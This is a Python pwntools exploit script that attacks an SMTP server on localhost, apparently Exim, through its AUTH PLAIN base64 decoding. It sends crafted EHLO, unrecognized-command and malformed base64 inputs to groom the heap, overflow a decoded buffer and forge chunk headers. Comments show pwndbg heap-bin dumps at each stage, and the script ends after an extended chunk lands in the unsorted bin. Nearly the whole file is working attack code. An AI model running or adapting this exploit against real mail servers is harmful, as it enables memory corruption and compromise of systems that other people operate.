#!/usr/bin/python2

import time

from pwn import *

p = None


def ehlo(v):
    p.sendline("EHLO " + v)
    print(p.recvuntil("HELP"))


def unrec(v):
    p.sendline(v)
    print(p.recvuntil("command"))


def bad_base64(v):
    return v.encode("base64").replace("\n", "").replace("=", "")


def auth_plain(v):
    p.sendline("AUTH PLAIN {}".format(v))
    print(p.recvuntil("data"))


def exploit():
    global p

    p = remote("localhost", 25)

    time.sleep(0.6)

    # 2000 = 0x7d0
    # 8000 = 0x1f40
    # 8200 = 0x2008

    ehlo("A" * 0x1F40)
    ehlo("B" * 0x10)
    unrec("\xff" * 0x7D0)
    ehlo("C" * 0x2008)
    auth_plain(bad_base64("D" * 0x2008)[:-1] + "PE")
    new_header_offset = (
        0xD0 - 0x10 - 0x10
    )  # extension size (0x20f0-0x2020) - chunk and storeblock headers size (0x10+0x10)
    b2_size = 0x2008  # size of second b64 decoded storeblock
    fake_chunk_header = p64(0)  # prev_size
    fake_chunk_header += p64(0x1F51)  # size
    auth_plain(
        bad_base64(
            "E" * new_header_offset
            + fake_chunk_header
            + "F" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    )
    ehlo("G" * 16)

    """
    pwndbg> unsortedbin 
    unsortedbin
    all: 0x55555585bcd0 -> 0x555555853d20 -> 0x555555861d60 -> 0x55555584fce0 -> 0x55555585fd10 <- ...
    """

    unrec("\xff" * 0x7D0)
    unrec("\xff" * 0x7D0)

    """
    pwndbg> unsortedbin 
    unsortedbin
    all: 0x0

    pwndbg> largebins 
    largebins
    0x3000: 0x555555853d20 -> 0x7ffff6e38258 (main_arena+1880) <- 0x555555853d20
    0x4000: 0x55555584fce0 -> 0x7ffff6e38268 (main_arena+1896) <- 0x55555584fce0
    """
    fake_chunk_header = p64(0x4110)
    fake_chunk_header += p64(0x1F50)
    auth_plain(
        bad_base64(
            "H" * new_header_offset
            + fake_chunk_header
            + "I" * (b2_size - new_header_offset - len(fake_chunk_header))
        )
    )

    """
    after auth plain our extended chunk is at the front of the unsorted bin
    pwndbg> unsortedbin 
    unsortedbin
    all: 0x555555851d00 -> 0x7ffff6e37b58 (main_arena+88) <- 0x555555851d00
    """


if __name__ == "__main__":
    exploit()
